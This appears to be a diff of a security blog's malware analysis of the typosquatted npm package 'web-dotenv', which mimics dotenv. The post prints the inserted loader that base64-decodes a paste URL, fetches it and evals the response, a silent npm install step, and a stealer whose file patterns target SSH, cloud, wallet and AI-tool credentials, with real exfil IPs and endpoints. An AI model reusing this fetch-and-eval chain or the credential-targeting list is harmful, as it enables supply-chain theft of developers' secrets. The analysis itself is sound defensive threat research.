@@ -6,11 +6,11 @@ packageName: web-dotenv
 ecosystem: npm
 ---
 
-`dotenv` is one of npm's most-installed packages — about 50M downloads a week. Four days ago a fresh gmail published `web-dotenv` (one prefix away), a near-byte-identical clone whose `package.json` still points `repository.url` at the upstream repo. The diff against `motdotla/dotenv` is one function and one call to it, both inside `lib/main.js`. The trigger is `config()` — what every consumer calls as `require('web-dotenv').config()` on application boot.
+`dotenv` pulls ~50M downloads a week, so `web-dotenv` — a near-byte-identical clone published from a fresh gmail, `repository.url` still pointing upstream — only had to be one prefix away. The diff against `motdotla/dotenv` is one function and one call site in `lib/main.js`, and the call sits in `config()`, what every consumer runs on application boot.
 
 ## Stage 1: the inserted function
 
-A new top-level helper, and one call wedged into the first line of `config()`:
+One helper, one call wedged into the first line of `config()`:
 
 <pre class="lang-js"><code><span class="tok-kw">function</span> <span class="tok-fn">configfix</span>() {
   <span class="tok-builtin">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(<span class="tok-fn">atob</span>(<span class="tok-str">'CWh0dHBzOi8vd3d3Lmpzb25rZWVwZXIuY29tL2IvVktVTkk='</span>))
@@ -24,7 +24,7 @@ A new top-level helper, and one call wedged into the first line of `config()`:
 }
 </code></pre>
 
-The base64 has a leading tab — the only nod to obfuscation — and decodes to `\thttps://www.jsonkeeper.com/b/VKUNI`. The bin returns a JSON object whose `content` field is Stage 2's obfuscated JS, and `eval` runs it. There is no `postinstall` hook: the chain fires the first time any code path reaches `dotenv.config()`, so registry scanners and lockfile audits both see nothing. The author iterated visibly between versions:
+The base64 carries a leading tab — the only nod to obfuscation — and decodes to a jsonkeeper URL whose `content` field `eval` runs; with no `postinstall` hook, the chain fires the first time a code path reaches `dotenv.config()` and registry scanners see nothing — and the author iterated between versions:
 
 - `1.0.0` (2026-05-22) inlined the entire Stage 2 obfuscator inside `configfix()`
 - `1.0.2` (three days later) outsourced it to jsonkeeper for a smaller tarball and a mutable payload
@@ -38,7 +38,7 @@ The base64 has a leading tab — the only nod to obfuscation — and decodes to 
 
 ## Stage 2: the jsonkeeper loader
 
-The bin is 19 KB of obfuscator.io output — a 237-entry string array and the standard array-rotation IIFE around an RC4-ish decoder. Stepped through in an instrumented sandbox it does exactly two things:
+The bin is 19 KB of obfuscator.io output that does exactly two things:
 
 <pre class="lang-js"><code><span class="tok-fn">execSync</span>(
   <span class="tok-str">'npm install axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent'</span>,
@@ -50,7 +50,7 @@ The bin is 19 KB of obfuscator.io output — a 237-entry string array and the st
 ).<span class="tok-fn">then</span>(r =&gt; <span class="tok-fn">eval</span>(r.data));
 </code></pre>
 
-The `--no-save` flag means the install touches neither the parent project's manifest nor its lockfile. The runtime deps land under `$TMPDIR/node_modules/` and Node finds them via parent-directory resolution from the next stage. The hex tail `329f753d052f978a486cdce9896050bb` is the campaign identifier and reappears as the `uid` field in every Stage-3 exfil packet. `socket.io-client` is pre-positioned but unused by Stage 3 as shipped — wiring for a later iteration.
+`--no-save` keeps the install out of the manifest and lockfile; the deps land under `$TMPDIR/node_modules/` where the next stage resolves them. The hex tail is the campaign UID, reappearing in every Stage-3 exfil packet, and `socket.io-client` is pre-positioned but unused as shipped — wiring for a later iteration.
 
 | | Trait | What it caught |
 | --- | --- | --- |
@@ -61,7 +61,7 @@ The `--no-save` flag means the install touches neither the parent project's mani
 
 ## Stage 3: stealer + clipper
 
-The body from `216.126.224.247` is 110 KB of the same obfuscator style. It writes two files to `os.tmpdir()` and detaches them:
+The 110 KB body from `216.126.224.247` writes two files to `os.tmpdir()`, detaches them, and also passes each inline as `node -e` to `spawn()` as a fallback:
 
 <pre class="lang-js"><code>fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'scdata'</span>), &lt;stealer&gt;);
 fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'ldata'</span>),  &lt;clipper&gt;);
@@ -69,17 +69,15 @@ fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(o
 <span class="tok-fn">exec</span>(<span class="tok-str">'node ldata'</span>,  { cwd: os.<span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
 </code></pre>
 
-Both files are also passed inline a second time as `node -e '<source>'` to a `spawn()` call — a belt-and-braces fallback if the on-disk write fails.
-
 ### `scdata` — the file stealer
 
-`scdata` walks the user's home directory (and on Windows every drive reported by `Get-CimInstance Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID`) for files matching:
+`scdata` walks `$HOME` (and on Windows every drive from `Get-CimInstance Win32_LogicalDisk`) for files matching:
 
 - Wallet / crypto: `*metamask*`, `*bitcoin*`, `*btc*`, `*solana*`, `*private key*`, `*secret phrase*`, `*.dat`
 - Secrets / config: `*.env*`, `*.pem`, `*.secret`, `*.key`, `*.json`, `*.yaml`, `*.yml`, `*.ini`, `*.sqlite`
 - Documents: `*.pdf`, `*.docx`, `*.doc`, `*.xlsx`, `*.xls`, `*.csv`, `*.txt`, `*.md`, `*.rtf`, `*.odt`
 
-…inside an allow-list of high-value directories. The list reads like 2026's dev surface — `.claude`, `.cursor`, `.windsurf`, `.pearai`, `.gemini`, `.eigent`, `.devctl` sit next to `.aws`, `.azure`, `.ssh`, `.gnupg`, `.docker`, and the Web3 workspaces `.brownie`, `.move`, `.sol`:
+…but only inside an allow-list of high-value directories that reads like 2026's dev surface — AI-tool config dirs beside cloud creds, SSH/GPG, and Web3 workspaces — uploading each match as `multipart/form-data` to bulk-exfil `216.126.224.220:5976/upload`, one hop from Stage-3 control at `.247` in the same Tier.Net `/22`:
 
 ```
 .aws  .azure  .ssh  .gnupg  .docker  .config  .cache
@@ -89,11 +87,9 @@ Both files are also passed inline a second time as `node -e '<source>'` to a `sp
 .steam  .snipaste  .yarn  .nvm  .node-gyp  .expo  .next
 ```
 
-Each match is uploaded as `multipart/form-data` to `http://216.126.224.220:5976/upload`. Stage-3 control sits at `.247`, bulk exfil at `.220`, both inside the same Tier.Net `/22` (`216.126.224.0/22`).
-
 ### `ldata` — the clipboard watcher
 
-`ldata` polls the clipboard every 750 ms and POSTs deltas back to the Stage-2 host. The read command depends on the platform:
+`ldata` is a watcher, not a swapper: it polls the clipboard every 750 ms — whatever the developer pastes, including secrets and wallet addresses — and POSTs the deltas to the Stage-2 host's plausible-looking `/npm-compiler.log`, reading per platform:
 
 - macOS: `pbpaste`
 - Windows: `powershell -NoProfile -NonInteractive Get-Clipboard`
@@ -105,8 +101,6 @@ Each match is uploaded as `multipart/form-data` to `http://216.126.224.220:5976/
   t:       <span class="tok-str">'102'</span>
 });
 </code></pre>
-
-It is a watcher, not a swapper — the take is whatever the developer puts on the clipboard during the affected process's lifetime: secrets pasted from a password manager, copied wallet addresses, seed-phrase fragments. The exfil path `/npm-compiler.log` keeps the POST URL plausible at a glance.
 
 | | Trait | What it caught |
 | --- | --- | --- |
@@ -121,7 +115,7 @@ It is a watcher, not a swapper — the take is whatever the developer puts on th
 
 ## Why this works
 
-`web-dotenv` ships 99% of `dotenv`'s source verbatim, and its diff is one function plus one call site. The trigger is runtime, not install: every prior post in this series detonated from `postinstall`, which every modern audit flags. This one fires the first time any consumer reaches `dotenv.config()` — much later, much harder to catch. Both downstream stages are paste-hosted, so the version pinned in any victim's lockfile is permanently fresh; the 1.0.0 → 1.0.2 diff already shows the author swapping the loader without bumping anything a consumer would notice.
+A verbatim clone whose only diff fires at runtime from `config()` — not the `postinstall` every audit flags — with both downstream stages paste-hosted, so the version pinned in a victim's lockfile stays permanently fresh; the [Fallout report](https://lab.atomdrift.org/file/6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6) returns malicious at probability 1.0.
 
 ## Likely actor
 
@@ -136,11 +130,9 @@ It is a watcher, not a swapper — the take is whatever the developer puts on th
 | Stage-3 host | `216.126.224.247` (Tier.Net Technologies LLC) |
 | Bulk exfil host | `216.126.224.220:5976` (Tier.Net Technologies LLC) |
 
-"Jean Dupont" is the French equivalent of "John Doe" — placeholder name, real gmail behind it. The technical signature differs from last week's `shinydv412` / `devcarron` cluster: those dropped a PE binary out of IPFS, this one is pure JavaScript, AI-tool–aware in its targeting list, and runtime-triggered rather than install-time. Different shop.
+"Jean Dupont" is the French "John Doe" — placeholder name, real gmail — and the signature differs from last week's `shinydv412` / `devcarron` IPFS-PE cluster: pure JavaScript, AI-tool–aware targeting, runtime-triggered.
 
-**Update (2026-05-28).** Two days after this post, [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/) turned up running the identical endgame. It drops the same two-file stealer pair the same way, and ships the loot to the very same upload endpoint — `http://216.126.224.220:5976/upload`, byte-for-byte, not merely the same range. It reaches its loader through jsonkeeper.com and an `/api/service/<hex>` path on an adjacent Tier.Net address — web-dotenv's exact delivery shape. That package is attributed to the DPRK's Contagious Interview campaign (FAMOUS CHOLLIMA) by [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). The shared sink is the tell: this is almost certainly the same operation, and `jean_dupont24` reads as a Contagious Interview persona rather than an independent actor. The "different shop" call above still holds against the IPFS PE cluster — but against BeaverTail and InvisibleFerret, it is the same shop.
-
-The [Fallout report](https://lab.atomdrift.org/file/6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6) returns malicious at probability 1.0.
+**Update (2026-05-28).** Two days later [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/) turned up running the identical endgame — same two-file stealer pair, same jsonkeeper-plus-`/api/service/<hex>` delivery, and the byte-for-byte same `216.126.224.220:5976/upload` sink — and it is attributed to the DPRK's Contagious Interview campaign (FAMOUS CHOLLIMA) by [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). The shared sink makes `jean_dupont24` a Contagious Interview persona, not an independent actor: still a different shop than the IPFS-PE cluster, but the same shop behind BeaverTail and InvisibleFerret.
 
 ## Indicators
 
